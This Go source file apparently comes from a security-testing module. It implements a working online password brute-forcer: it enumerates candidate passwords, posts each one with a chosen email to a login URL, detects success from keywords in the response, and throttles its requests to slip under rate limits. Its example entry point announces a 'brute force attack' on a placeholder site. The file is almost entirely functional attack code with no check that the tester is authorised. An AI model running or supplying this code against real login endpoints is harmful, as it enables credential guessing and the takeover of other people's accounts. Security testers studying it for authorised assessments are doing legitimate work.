package loginPenetration

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/erikpa1/TurtleIntelligenceBackend/db"
	"github.com/erikpa1/TurtleIntelligenceBackend/models"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"io"
	"net/http"
	"strings"
	"time"
)

const CT_PENTESTING = "security_loginpentesting"

func RunLoginPenTest(user *models.User, testUid primitive.ObjectID) {
	test := db.GetByIdAndOrg[LoginPenetration](CT_PENTESTING, testUid, user.Org)
	ExecuteLoginBruteForce(test)
}

// ExecuteLoginBruteForce attempts to brute force login with generated passwords
func ExecuteLoginBruteForce(config *LoginPenetration) (*BruteForceResult, error) {
	// Character set for password generation (basic ASCII characters)
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%"

	result := &BruteForceResult{
		Success: false,
	}

	startTime := time.Now()
	var attempts int64 = 0

	// Start with 4 character passwords and increase length
	for length := 4; attempts < config.IterationsCount; length++ {
		// Generate and test passwords of current length
		if tryPasswordsOfLength(config, charset, length, &attempts, result) {
			result.Duration = time.Since(startTime)
			result.Attempts = attempts
			return result, nil
		}

		// Break if we've reached iteration limit
		if attempts >= config.IterationsCount {
			break
		}
	}

	result.Duration = time.Since(startTime)
	result.Attempts = attempts
	return result, nil
}

// tryPasswordsOfLength generates and tests all passwords of a specific length
func tryPasswordsOfLength(config *LoginPenetration, charset string, length int, attempts *int64, result *BruteForceResult) bool {
	password := make([]byte, length)
	indices := make([]int, length)

	for {
		// Check if we've exceeded iteration count
		if *attempts >= config.IterationsCount {
			return false
		}

		// Build current password from indices
		for i := 0; i < length; i++ {
			password[i] = charset[indices[i]]
		}

		passwordStr := string(password)
		*attempts++

		// Test the password
		if testLogin(config, passwordStr, result) {
			result.Success = true
			result.Password = passwordStr
			return true
		}

		// Generate next password combination
		if !incrementIndices(indices, len(charset)) {
			// All combinations for this length exhausted
			return false
		}
	}
}

// incrementIndices increments the indices array like a base-n number
func incrementIndices(indices []int, base int) bool {
	for i := len(indices) - 1; i >= 0; i-- {
		indices[i]++
		if indices[i] < base {
			return true
		}
		indices[i] = 0
	}
	return false // Overflow - all combinations exhausted
}

// testLogin attempts to login with given credentials
func testLogin(config *LoginPenetration, password string, result *BruteForceResult) bool {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Prepare login payload (adjust structure based on your target API)
	loginData := map[string]string{
		"email":    config.Email,
		"password": password,
	}

	jsonData, err := json.Marshal(loginData)
	if err != nil {
		return false
	}

	req, err := http.NewRequest("POST", config.Url, bytes.NewBuffer(jsonData))
	if err != nil {
		return false
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "SecurityTester/1.0")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseBody = string(body)

	// Check for successful login (adjust based on your API response)
	// Common success indicators: 200 status, token in response, success field
	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		bodyLower := strings.ToLower(string(body))
		if strings.Contains(bodyLower, "token") ||
			strings.Contains(bodyLower, "success") ||
			strings.Contains(bodyLower, "authenticated") {
			return true
		}
	}

	// Add small delay to avoid rate limiting
	time.Sleep(100 * time.Millisecond)

	return false
}

// Example usage
func main() {
	config := &LoginPenetration{
		Uid:             primitive.NewObjectID(),
		Name:            "Test Login Penetration",
		Url:             "https://example.com/api/login",
		Email:           "test@example.com",
		IterationsCount: 10000,
	}

	fmt.Printf("Starting brute force attack on: %s\n", config.Url)
	fmt.Printf("Target email: %s\n", config.Email)
	fmt.Printf("Max iterations: %d\n", config.IterationsCount)
	fmt.Println("----------------------------------------")

	result, err := ExecuteLoginBruteForce(config)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	fmt.Printf("\nResults:\n")
	fmt.Printf("Success: %v\n", result.Success)
	fmt.Printf("Attempts: %d\n", result.Attempts)
	fmt.Printf("Duration: %v\n", result.Duration)

	if result.Success {
		fmt.Printf("Password Found: %s\n", result.Password)
		fmt.Printf("Status Code: %d\n", result.StatusCode)
	} else {
		fmt.Println("Password not found within iteration limit")
	}
}
